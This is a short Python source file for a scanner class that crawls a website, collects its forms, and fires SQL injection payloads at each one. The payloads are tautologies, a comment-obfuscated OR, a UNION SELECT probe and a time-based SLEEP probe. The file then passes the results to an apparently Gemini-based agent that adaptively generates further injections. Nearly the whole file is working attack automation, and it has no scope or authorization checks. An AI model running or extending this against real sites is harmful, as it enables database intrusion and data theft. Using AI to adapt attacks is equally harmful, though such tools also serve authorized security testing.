from main.service.crawler import WebCrawler
from main.tests.sql_injection import SQLInjector
from main.service.sql_generator import GeminiFeedbackAgent

class Scaner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip("/")
        self.injector = SQLInjector() 
        self.crawler = WebCrawler(self.base_url, session=self.injector.session) 
        self.ai = GeminiFeedbackAgent()

    def crawl(self):
        surface = self.crawler.run()
        attack_results = []

        for page in surface:
            for form in page["forms"]:
                seed_payloads = [
                    "' OR 1=1--",
                    "'/**/OR/**/1=1--",
                    "' AND 1=2--",
                    "' UNION SELECT NULL,NULL--",
                    "' OR IF(1=1,SLEEP(5),0)--"
                ]
                
                history = {}
                def tester(payload):
                    return self.injector.send_payload(form, payload)

                for payload in seed_payloads:
                    history[payload] = tester(payload)
                ai_results = self.ai.adaptive_loop(tester, initial_history=history, max_rounds=2)

                attack_results.append({
                    "url": form["action"],
                    "results": ai_results
                })
        return attack_results